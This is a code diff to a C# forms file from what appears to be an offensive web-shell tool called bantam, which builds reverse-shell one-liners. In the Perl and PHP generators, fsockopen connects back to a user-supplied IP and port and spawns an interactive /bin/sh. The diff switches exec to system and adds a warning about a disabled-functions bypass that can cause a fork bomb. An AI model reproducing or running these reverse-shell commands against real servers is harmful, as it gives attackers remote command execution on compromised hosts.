@@ -49,9 +49,6 @@ namespace bantam.Forms
         /// <returns></returns>
         public string PerlShell(string ip, string port)
         {
-            //todo
-            //validate ip IP
-            //validate port range
             string perlShell = "perl -e 'use Socket;"
                              + "$i=\"" + ip + "\";"
                              + "$p=" + port + ";"
@@ -99,7 +96,7 @@ namespace bantam.Forms
         {
             //todo this requires exec, lets add more shell execution methods incause of disabled functions or possibly not use two system calls???
             string phpShell = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");"
-                            + "exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
+                            + "system(\"/bin/sh -i <&3 >&3 2>&3\");'";
 
             return phpShell;
         }
@@ -203,6 +200,11 @@ namespace bantam.Forms
             PopReverseShell(shellCode);
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private async void buttonGetIpv4_Click(object sender, EventArgs e)
         {
             var task = WebHelper.GetRequest("http://ipv4.icanhazip.com/");
@@ -217,10 +219,28 @@ namespace bantam.Forms
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void textBoxPort_KeyPress(object sender, KeyPressEventArgs e)
         {
             if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
                 e.Handled = true;
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private void checkBoxDisabledFunctionsBypass_CheckedChanged(object sender, EventArgs e)
+        {
+            if (checkBoxDisabledFunctionsBypass.Checked) {
+                MessageBox.Show("You should only use this if all process execution methods are disabled, it can could potentially cause a fork bomb or other undesirable results.\r\r" +
+                                "Furthermore the web_root must be writeable, and you may need to perform cleanup in that directory", "Warning!!!");
             }
         }
     }
